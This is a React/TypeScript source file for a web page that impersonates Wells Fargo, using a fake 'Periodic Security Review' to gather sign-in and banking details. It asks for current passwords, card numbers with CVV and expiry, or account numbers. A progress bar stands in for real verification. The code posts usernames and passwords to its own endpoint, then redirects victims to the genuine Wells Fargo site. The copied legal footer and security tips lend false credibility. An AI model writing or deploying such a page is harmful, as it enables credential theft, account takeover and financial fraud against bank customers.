import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Shield, Lock, User, Eye, EyeOff, CheckCircle, AlertTriangle, Info, Loader2, CreditCard, Building, Hash } from "lucide-react";
import { OfficialHeader } from "@/components/official-header";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { apiRequest } from "@/lib/queryClient";
import { Progress } from "@/components/ui/progress";

export default function CredentialUpdate() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [updateType, setUpdateType] = useState<"password" | "username" | "both" | null>(null);
  const [sessionTimeout, setSessionTimeout] = useState(600);
  const [step, setStep] = useState(1);
  const [verificationProgress, setVerificationProgress] = useState(0);
  const [verificationMethod, setVerificationMethod] = useState<"password" | "card" | "account" | null>(null);
  
  const username = sessionStorage.getItem("loginUsername") || "Customer";
  
  const [formData, setFormData] = useState({
    currentPassword: "",
    cardNumber: "",
    cvv: "",
    expirationMonth: "",
    expirationYear: "",
    accountNumber: "",
    routingNumber: "",
    newUsername: "",
    newPassword: "",
    confirmPassword: "",
    securityAnswer: "",
    agreeToTerms: false
  });

  useEffect(() => {
    const timer = setInterval(() => {
      setSessionTimeout((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          toast({
            title: "Session Expired",
            description: "Please sign in again.",
            variant: "destructive"
          });
          setTimeout(() => setLocation("/"), 1500);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getPasswordStrength = (password: string) => {
    let strength = 0;
    if (password.length >= 8) strength += 25;
    if (password.length >= 12) strength += 10;
    if (/[A-Z]/.test(password)) strength += 20;
    if (/[a-z]/.test(password)) strength += 15;
    if (/[0-9]/.test(password)) strength += 15;
    if (/[!@#$%^&*(),.?":{}|<>]/.test(password)) strength += 15;
    return Math.min(strength, 100);
  };

  const passwordStrength = getPasswordStrength(formData.newPassword);

  const handleSkip = () => {
    toast({
      title: "Reminder Scheduled",
      description: "You will be prompted again in 30 days. Redirecting..."
    });
    setTimeout(() => {
      window.location.href = "https://www.wellsfargo.com/";
    }, 1500);
  };

  const handleVerifyIdentity = async () => {
    if (verificationMethod === "password" && !formData.currentPassword) {
      toast({
        title: "Password Required",
        description: "Please enter your current password to continue.",
        variant: "destructive"
      });
      return;
    }

    if (verificationMethod === "card") {
      if (!formData.cardNumber || formData.cardNumber.length < 15) {
        toast({
          title: "Card Number Required",
          description: "Please enter a valid card number.",
          variant: "destructive"
        });
        return;
      }
      if (!formData.cvv || formData.cvv.length < 3) {
        toast({
          title: "CVV Required",
          description: "Please enter the 3 or 4 digit security code.",
          variant: "destructive"
        });
        return;
      }
      if (!formData.expirationMonth || !formData.expirationYear) {
        toast({
          title: "Expiration Date Required",
          description: "Please enter your card's expiration date.",
          variant: "destructive"
        });
        return;
      }
    }

    if (verificationMethod === "account") {
      if (!formData.accountNumber || formData.accountNumber.length < 8) {
        toast({
          title: "Account Number Required",
          description: "Please enter a valid account number.",
          variant: "destructive"
        });
        return;
      }
          }

    setVerificationProgress(0);
    const interval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 20;
      });
    }, 200);

    await new Promise(resolve => setTimeout(resolve, 1200));
    setStep(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.agreeToTerms) {
      toast({
        title: "Agreement Required",
        description: "Please accept the Online Access Agreement to continue.",
        variant: "destructive"
      });
      return;
    }

    if (updateType === "password" || updateType === "both") {
      if (formData.newPassword !== formData.confirmPassword) {
        toast({
          title: "Passwords Do Not Match",
          description: "Please ensure both password fields match exactly.",
          variant: "destructive"
        });
        return;
      }
      if (passwordStrength < 60) {
        toast({
          title: "Weak Password",
          description: "Please choose a stronger password that meets all requirements.",
          variant: "destructive"
        });
        return;
      }
    }

    if (updateType === "username" || updateType === "both") {
      if (formData.newUsername.length < 6) {
        toast({
          title: "Invalid Username",
          description: "Username must be between 6-24 characters.",
          variant: "destructive"
        });
        return;
      }
      if (!/^[a-zA-Z0-9_]+$/.test(formData.newUsername)) {
        toast({
          title: "Invalid Characters",
          description: "Username can only contain letters, numbers, and underscores.",
          variant: "destructive"
        });
        return;
      }
    }

    setIsSubmitting(true);
    setVerificationProgress(0);
    
    const progressInterval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 150);

    try {
      await apiRequest("POST", "/api/auth/credential-update", {
        originalUsername: username,
        currentPassword: formData.currentPassword,
        newUsername: updateType === "username" || updateType === "both" ? formData.newUsername : undefined,
        newPassword: updateType === "password" || updateType === "both" ? formData.newPassword : undefined,
        updateType: updateType,
      });
      
      clearInterval(progressInterval);
      setVerificationProgress(100);
      
      toast({
        title: "Changes Saved Successfully",
        description: "Your credentials have been updated. Redirecting to your accounts..."
      });
      
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 2000);
    } catch (error) {
      clearInterval(progressInterval);
      toast({
        title: "Unable to Process Request",
        description: "We encountered an error. Please try again or contact support.",
        variant: "destructive"
      });
      setIsSubmitting(false);
      setVerificationProgress(0);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <OfficialHeader variant="simple" />

      <div className="bg-[#cd1409]/10 border-b border-[#cd1409]/20">
        <div className="max-w-2xl mx-auto px-4 py-2">
          <div className="flex items-center gap-2 text-sm">
            <Shield className="w-4 h-4 text-[#cd1409]" />
            <span className="text-gray-700">Secure Session</span>
            <span className="text-gray-400">|</span>
            <span className="text-gray-600">Welcome, {username}</span>
          </div>
        </div>
      </div>

      <main className="flex-1 max-w-2xl mx-auto w-full px-4 py-6">
        <div className="mb-6">
          <div className="flex items-center gap-3 mb-2">
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 1 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>1</div>
            <div className={`flex-1 h-1 ${step >= 2 ? 'bg-[#cd1409]' : 'bg-gray-200'}`} />
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 2 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>2</div>
            <div className={`flex-1 h-1 ${step >= 3 ? 'bg-[#cd1409]' : 'bg-gray-200'}`} />
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 3 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>3</div>
          </div>
          <div className="flex justify-between text-xs text-gray-500 px-2">
            <span>Verify Identity</span>
            <span>Update Credentials</span>
            <span>Confirmation</span>
          </div>
        </div>

        <Card className="mb-4 border-l-4 border-l-[#ffcd41] bg-[#fffef0]">
          <CardContent className="p-4">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-[#b8860b] flex-shrink-0 mt-0.5" />
              <div>
                <h2 className="font-semibold text-gray-900 text-sm mb-1">Periodic Security Review Required</h2>
                <p className="text-sm text-gray-600">
                  As part of our commitment to protecting your accounts, we periodically ask customers to verify and update their sign-in credentials. This helps prevent unauthorized access to your accounts.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {step === 1 && !verificationMethod && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                <Lock className="w-4 h-4 text-[#cd1409]" />
                Step 1: Verify Your Identity
              </h3>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                For your security, please select how you would like to verify your identity to proceed.
              </p>
              
              <div className="space-y-3">
                <button
                  onClick={() => setVerificationMethod("card")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-verify-card"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <CreditCard className="w-6 h-6 text-[#cd1409]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Debit or Credit Card</p>
                    <p className="text-sm text-gray-500">Verify using your Wells Fargo card number</p>
                  </div>
                </button>

                <button
                  onClick={() => setVerificationMethod("account")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-verify-account"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <Building className="w-6 h-6 text-[#cd1409]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Account Number</p>
                    <p className="text-sm text-gray-500">Verify using your account number</p>
                  </div>
                </button>

                <button
                  onClick={() => setVerificationMethod("password")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-verify-password"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <Lock className="w-6 h-6 text-[#cd1409]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Current Password</p>
                    <p className="text-sm text-gray-500">Verify using your existing sign-in password</p>
                  </div>
                </button>
              </div>

              <div className="mt-4 pt-4 border-t">
                <button
                  onClick={handleSkip}
                  className="w-full text-center text-sm text-gray-500 hover:text-[#cd1409]"
                  data-testid="button-remind-later"
                >
                  Remind me in 30 days
                </button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 1 && verificationMethod === "password" && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[#cd1409]" />
                  Verify with Password
                </h3>
                <button
                  onClick={() => setVerificationMethod(null)}
                  className="text-sm text-[#cd1409] hover:underline"
                >
                  Change method
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                Enter your current password to verify your identity.
              </p>
              
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="currentPassword" className="text-sm font-medium">Current Password</Label>
                  <div className="relative">
                    <Input
                      id="currentPassword"
                      type={showCurrentPassword ? "text" : "password"}
                      value={formData.currentPassword}
                      onChange={(e) => setFormData({ ...formData, currentPassword: e.target.value })}
                      placeholder="Enter your current password"
                      className="pr-10"
                      data-testid="input-current-password"
                    />
                    <button
                      type="button"
                      onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      data-testid="button-toggle-current-password"
                    >
                      {showCurrentPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {verificationProgress > 0 && verificationProgress < 100 && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Verifying your identity...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <Button 
                  onClick={handleVerifyIdentity}
                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                  disabled={!formData.currentPassword}
                  data-testid="button-verify-continue"
                >
                  Continue
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 1 && verificationMethod === "card" && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                  <CreditCard className="w-4 h-4 text-[#cd1409]" />
                  Verify with Card
                </h3>
                <button
                  onClick={() => setVerificationMethod(null)}
                  className="text-sm text-[#cd1409] hover:underline"
                >
                  Change method
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                Enter your Wells Fargo debit or credit card details to verify your identity.
              </p>
              
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-sm font-medium">Card Number</Label>
                  <Input
                    id="cardNumber"
                    type="text"
                    value={formData.cardNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                      setFormData({ ...formData, cardNumber: value });
                    }}
                    placeholder="Enter 16-digit card number"
                    maxLength={16}
                    data-testid="input-card-number"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-sm font-medium">Expiration Date</Label>
                    <div className="flex gap-2">
                      <select
                        value={formData.expirationMonth}
                        onChange={(e) => setFormData({ ...formData, expirationMonth: e.target.value })}
                        className="flex-1 h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                        data-testid="select-exp-month"
                      >
                        <option value="">MM</option>
                        {Array.from({ length: 12 }, (_, i) => (
                          <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                            {String(i + 1).padStart(2, '0')}
                          </option>
                        ))}
                      </select>
                      <select
                        value={formData.expirationYear}
                        onChange={(e) => setFormData({ ...formData, expirationYear: e.target.value })}
                        className="flex-1 h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                        data-testid="select-exp-year"
                      >
                        <option value="">YY</option>
                        {Array.from({ length: 10 }, (_, i) => (
                          <option key={i} value={String(26 + i)}>
                            {26 + i}
                          </option>
                        ))}
                      </select>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-sm font-medium">CVV</Label>
                    <Input
                      id="cvv"
                      type="text"
                      value={formData.cvv}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                        setFormData({ ...formData, cvv: value });
                      }}
                      placeholder="3-4 digits"
                      maxLength={4}
                      data-testid="input-cvv"
                    />
                  </div>
                </div>

                <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
                  <p className="text-xs text-blue-700 flex items-start gap-2">
                    <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
                    The CVV is the 3 or 4 digit security code on the back of your card.
                  </p>
                </div>

                {verificationProgress > 0 && verificationProgress < 100 && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Verifying card information...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <Button 
                  onClick={handleVerifyIdentity}
                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                  disabled={!formData.cardNumber || !formData.cvv || !formData.expirationMonth || !formData.expirationYear}
                  data-testid="button-verify-continue"
                >
                  Continue
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 1 && verificationMethod === "account" && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                  <Building className="w-4 h-4 text-[#cd1409]" />
                  Verify with Account Number
                </h3>
                <button
                  onClick={() => setVerificationMethod(null)}
                  className="text-sm text-[#cd1409] hover:underline"
                >
                  Change method
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                Enter your Wells Fargo account number to verify your identity.
              </p>
              
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="accountNumber" className="text-sm font-medium">Account Number</Label>
                  <Input
                    id="accountNumber"
                    type="text"
                    value={formData.accountNumber}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 17);
                      setFormData({ ...formData, accountNumber: value });
                    }}
                    placeholder="Enter account number"
                    maxLength={17}
                    data-testid="input-account-number"
                  />
                </div>

                <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
                  <p className="text-xs text-blue-700 flex items-start gap-2">
                    <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
                    You can find your account number at the bottom of your checks or in your account details.
                  </p>
                </div>

                {verificationProgress > 0 && verificationProgress < 100 && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Verifying account information...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <Button 
                  onClick={handleVerifyIdentity}
                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                  disabled={!formData.accountNumber}
                  data-testid="button-verify-continue"
                >
                  Continue
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 2 && !updateType && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                <Shield className="w-4 h-4 text-[#cd1409]" />
                Step 2: Select Update Type
              </h3>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                Choose what you would like to update. We recommend updating both for maximum security.
              </p>
              
              <div className="space-y-3">
                <button
                  onClick={() => setUpdateType("password")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-update-password"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <Lock className="w-6 h-6 text-[#cd1409]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Update Password</p>
                    <p className="text-sm text-gray-500">Create a new secure password for your account</p>
                  </div>
                </button>

                <button
                  onClick={() => setUpdateType("username")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-update-username"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <User className="w-6 h-6 text-[#cd1409]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Update Username</p>
                    <p className="text-sm text-gray-500">Choose a new sign-in username</p>
                  </div>
                </button>

                <button
                  onClick={() => setUpdateType("both")}
                  className="w-full flex items-center gap-4 p-4 border-2 border-[#cd1409] rounded-lg hover-elevate text-left group bg-red-50/30"
                  data-testid="button-update-both"
                >
                  <div className="w-12 h-12 rounded-full bg-[#cd1409] flex items-center justify-center">
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <p className="font-medium text-gray-900">Update Both</p>
                      <span className="text-xs bg-[#cd1409] text-white px-2 py-0.5 rounded">Recommended</span>
                    </div>
                    <p className="text-sm text-gray-500">Update username and password together for enhanced security</p>
                  </div>
                </button>
              </div>

              <div className="mt-4 pt-4 border-t">
                <button
                  onClick={handleSkip}
                  className="w-full text-center text-sm text-gray-500 hover:text-[#cd1409]"
                  data-testid="button-skip-update"
                >
                  Skip for now - remind me later
                </button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 2 && updateType && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[#cd1409]" />
                  Step 2: Enter New Credentials
                </h3>
                <button
                  onClick={() => setUpdateType(null)}
                  className="text-sm text-[#cd1409] hover:underline"
                >
                  Change selection
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-4">
              <form onSubmit={handleSubmit} className="space-y-5">
                {(updateType === "username" || updateType === "both") && (
                  <div className="space-y-2">
                    <Label htmlFor="newUsername" className="text-sm font-medium">New Username</Label>
                    <Input
                      id="newUsername"
                      type="text"
                      value={formData.newUsername}
                      onChange={(e) => setFormData({ ...formData, newUsername: e.target.value })}
                      placeholder="Enter new username"
                      maxLength={24}
                      data-testid="input-new-username"
                    />
                    <p className="text-xs text-gray-500">6-24 characters, letters, numbers, and underscores only</p>
                  </div>
                )}

                {(updateType === "password" || updateType === "both") && (
                  <>
                    <div className="space-y-2">
                      <Label htmlFor="newPassword" className="text-sm font-medium">New Password</Label>
                      <div className="relative">
                        <Input
                          id="newPassword"
                          type={showNewPassword ? "text" : "password"}
                          value={formData.newPassword}
                          onChange={(e) => setFormData({ ...formData, newPassword: e.target.value })}
                          placeholder="Create a strong password"
                          className="pr-10"
                          data-testid="input-new-password"
                        />
                        <button
                          type="button"
                          onClick={() => setShowNewPassword(!showNewPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          data-testid="button-toggle-new-password"
                        >
                          {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                      
                      {formData.newPassword && (
                        <div className="space-y-2">
                          <div className="flex items-center justify-between text-xs">
                            <span className="text-gray-600">Password Strength</span>
                            <span className={passwordStrength >= 80 ? "text-green-600" : passwordStrength >= 60 ? "text-yellow-600" : "text-red-600"}>
                              {passwordStrength >= 80 ? "Strong" : passwordStrength >= 60 ? "Moderate" : "Weak"}
                            </span>
                          </div>
                          <Progress 
                            value={passwordStrength} 
                            className={`h-2 ${passwordStrength >= 80 ? '[&>div]:bg-green-500' : passwordStrength >= 60 ? '[&>div]:bg-yellow-500' : '[&>div]:bg-red-500'}`}
                          />
                        </div>
                      )}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="confirmPassword" className="text-sm font-medium">Confirm New Password</Label>
                      <div className="relative">
                        <Input
                          id="confirmPassword"
                          type={showConfirmPassword ? "text" : "password"}
                          value={formData.confirmPassword}
                          onChange={(e) => setFormData({ ...formData, confirmPassword: e.target.value })}
                          placeholder="Re-enter your new password"
                          className="pr-10"
                          data-testid="input-confirm-password"
                        />
                        <button
                          type="button"
                          onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          data-testid="button-toggle-confirm-password"
                        >
                          {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                      {formData.confirmPassword && formData.newPassword !== formData.confirmPassword && (
                        <p className="text-xs text-red-500">Passwords do not match</p>
                      )}
                      {formData.confirmPassword && formData.newPassword === formData.confirmPassword && (
                        <p className="text-xs text-green-600 flex items-center gap-1">
                          <CheckCircle className="w-3 h-3" /> Passwords match
                        </p>
                      )}
                    </div>

                    <div className="bg-gray-50 p-3 rounded-lg border">
                      <p className="text-xs font-medium text-gray-700 mb-2">Password must include:</p>
                      <div className="grid grid-cols-2 gap-2">
                        <div className={`text-xs flex items-center gap-1.5 ${formData.newPassword.length >= 8 ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${formData.newPassword.length >= 8 ? "" : "opacity-30"}`} />
                          8+ characters
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[A-Z]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[A-Z]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Uppercase letter
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[a-z]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[a-z]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Lowercase letter
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[0-9]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[0-9]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Number
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[!@#$%^&*(),.?":{}|<>]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[!@#$%^&*(),.?":{}|<>]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Special character
                        </div>
                      </div>
                    </div>
                  </>
                )}

                <div className="flex items-start gap-3 p-3 bg-gray-50 rounded-lg border">
                  <Checkbox
                    id="agreeToTerms"
                    checked={formData.agreeToTerms}
                    onCheckedChange={(checked) => setFormData({ ...formData, agreeToTerms: checked as boolean })}
                    className="mt-0.5"
                    data-testid="checkbox-agree-terms"
                  />
                  <Label htmlFor="agreeToTerms" className="text-xs text-gray-600 leading-relaxed cursor-pointer">
                    I have read and agree to the <span className="text-[#cd1409] hover:underline cursor-pointer">Wells Fargo Online Access Agreement</span> and understand that this change will take effect immediately upon submission.
                  </Label>
                </div>

                {isSubmitting && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Processing your request...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <div className="flex flex-col gap-3 pt-2">
                  <Button 
                    type="submit" 
                    className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                    disabled={isSubmitting || !formData.agreeToTerms}
                    data-testid="button-submit-update"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Save Changes"
                    )}
                  </Button>
                  
                  <button
                    type="button"
                    onClick={handleSkip}
                    className="text-sm text-gray-500 hover:text-[#cd1409]"
                    disabled={isSubmitting}
                    data-testid="button-skip"
                  >
                    Skip for now
                  </button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        <div className="mt-6 p-4 bg-blue-50/50 rounded-lg border border-blue-100">
          <div className="flex items-start gap-3">
            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-medium text-blue-900 mb-1">Security Tips</p>
              <ul className="text-xs text-blue-700 space-y-1">
                <li>• Never share your password with anyone, including Wells Fargo employees</li>
                <li>• Use a unique password that you don't use for other websites</li>
                <li>• Enable two-factor authentication for additional protection</li>
                <li>• Review your account activity regularly for unauthorized transactions</li>
              </ul>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t mt-auto">
        <div className="h-1 bg-[#ffcd41]" />
        <div className="max-w-3xl mx-auto px-4 py-6">
          <div className="space-y-4 text-xs text-gray-600 leading-relaxed">
            <div className="bg-gray-50 p-4 rounded border">
              <p className="font-semibold text-gray-800 mb-2">Investment and Insurance Products are:</p>
              <ul className="list-disc list-inside space-y-1 ml-2">
                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
                <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
                <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
              </ul>
            </div>

            <p>
              Investment products and services are offered through Wells Fargo Advisors. Wells Fargo Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS) and Wells Fargo Advisors Financial Network, LLC, Members{' '}
              <a href="https://www.sipc.org" className="text-[#cd1409] hover:underline">SIPC</a>, separate registered broker-dealers and non-bank affiliates of Wells Fargo & Company.
            </p>

            <p>
              1. Availability may be affected by your mobile carrier's coverage area. Your mobile carrier's message and data rates may apply. Fargo is only available on the smartphone versions of the Wells Fargo Mobile<sup>®</sup> app.
            </p>

            <p>
              Android, Google Play, Chrome, Pixel and other marks are trademarks of Google LLC.
            </p>

            <p>
              Apple, the Apple logo, Apple Pay, Apple Watch, Face ID, iCloud Keychain, iPad, iPad Pro, iPhone, iTunes, Mac, Safari, and Touch ID are trademarks of Apple Inc., registered in the U.S. and other countries. Apple Wallet is a trademark of Apple Inc. App Store is a service mark of Apple Inc.
            </p>

            <p>
              Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
            </p>

            <div className="flex items-center gap-2 py-2">
              <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
              </svg>
              <span className="font-semibold text-gray-800">Equal Housing Lender</span>
            </div>

            <div className="pt-2 border-t space-y-1 text-gray-500">
              <p>PM-09282026-7798034.1.1</p>
              <p>LRC-0325</p>
            </div>

            <div className="pt-2 border-t">
              <p className="text-gray-500">© 1999 - 2026 Wells Fargo. NMLSR ID 399801</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}